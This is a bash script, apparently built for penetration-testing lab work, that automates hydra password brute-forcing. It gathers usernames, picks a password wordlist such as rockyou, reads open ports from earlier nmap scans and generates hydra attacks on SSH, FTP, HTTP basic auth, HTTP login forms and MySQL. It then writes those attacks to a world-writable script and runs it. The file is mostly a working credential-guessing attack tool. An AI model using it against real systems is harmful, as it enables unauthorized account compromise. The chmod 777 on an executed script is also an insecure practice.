#!/usr/bin/bash
IP=$1
smbflag="o"

if [ $# -ne 1 ]; then
  echo "指定された引数は$#個です。"
  exit 1
fi

rm /root/Lab/$IP/hydrashell.sh
touch /root/Lab/$IP/hydrashell.sh
echo "#!/usr/bin/bash" > /root/Lab/$IP/hydrashell.sh

rm /root/Lab/$IP/uname
touch /root/Lab/$IP/uname

uname="x"
while [ "$uname" != "" ]
do
   read -p "uname > " uname
   if [ "$uname" != "" ]; then
      echo $uname >> /root/Lab/$IP/uname
   fi
   unamefile="/root/Lab/$IP/uname"
done

echo "1:/usr/share/seclists/Passwords/darkweb2017-top100.txt"
echo "2:/usr/share/seclists/Passwords/darkweb2017-top1000.txt"
echo "3:/usr/share/john/password.lst"
echo "4:/usr/share/wordlists/rockyou.txt"
read -p "pwfile wo sentaku > " pw

if [ "$pw" = "1" ]; then
   pwfile="/usr/share/seclists/Passwords/darkweb2017-top100.txt"
fi
if [ "$pw" = "2" ]; then
   pwfile="/usr/share/seclists/Passwords/darkweb2017-top1000.txt"
fi
if [ "$pw" = "3" ]; then
   pwfile="/usr/share/john/password.lst"
fi
if [ "$pw" = "4" ]; then
   pwfile="/usr/share/wordlists/rockyou.txt"
fi

grep tcp /root/Lab/$IP/TCP_sV.nmap | grep open
grep udp /root/Lab/$IP/UDP_sV.nmap | grep open
proto="x"
port="x"

while [ "$proto" != "" -a "port" != "" ]
do

   read -p "port= " port
   read -p "Protocol(ssh,ftp,http-basic,http-form,mysql) > " proto
   read -p "option (-V/-d:debug/-S:SSL) > " option

   if [ "$proto" = "SSH" -o "$proto" = "ssh" ]; then
      script='hydra -L "'$unamefile'" -P "'$pwfile'" -e nsr -s '$port' -o "/root/Lab/'$IP'/Scan/tcp_'$port'_ssh_hydra.txt" '$option" ssh://"$IP
      echo $script
      echo $script >> /root/Lab/$IP/hydrashell.sh
   fi

   if [ "$proto" = "FTP" -o "$proto" = "ftp" ]; then
      script='hydra -L "'$unamefile'" -P "'$pwfile'" -e nsr -s '$port' -o "/root/Lab/'$IP'/Scan/tcp_'$port'_ftp_hydra.txt" '$option" ftp://"$IP
      echo $script
      echo $script >> /root/Lab/$IP/hydrashell.sh
   fi

   if [ "$proto" = "HTTP-BASIC" -o "$proto" = "http-basic" ]; then
      read -p "auth area ? > " auth_area
      script='hydra -L "'$unamefile'" -P "'$pwfile'" -e nsr -s '$port' -o "/root/Lab/'$IP'/Scan/tcp_'$port'_http-basic_hydra.txt" http-get://'$IP"/$auth_area"
      echo $script
      echo $script >> /root/Lab/$IP/hydrashell.sh
   fi

   if [ "$proto" = "MYSQL" -o "$proto" = "mysql" ]; then
      script='hydra -L "'$unamefile'" -P "'$pwfile'" -e nsr -s '$port' -o "/root/Lab/'$IP'/Scan/tcp_'$port'_mysql_hydra.txt" '$option" "$IP" mysql"
      echo $script
      echo $script >> /root/Lab/$IP/hydrashell.sh
   fi

   if [ "$proto" = "HTTP-FORM" -o "$proto" = "http-form" ]; then
      read -p "URL ? (ex.login.php) > " url
      read -p "post message ?  (ex. uname=^USER^&pwd=^PASS^) > " message 
      script='hydra -L "'$unamefile'" -P "'$pwfile'" -e nsr -s '$port' -o "/root/Lab/'$IP'/Scan/tcp_'$port'_http-form_hydra.txt" http-post-form://'$IP"/"$url":"$message":""invalid-login-message"
      echo $script
      echo $script >> /root/Lab/$IP/hydrashell.sh
   fi

done

sudo chmod 777 /root/Lab/$IP/hydrashell.sh
/root/Lab/$IP/hydrashell.sh

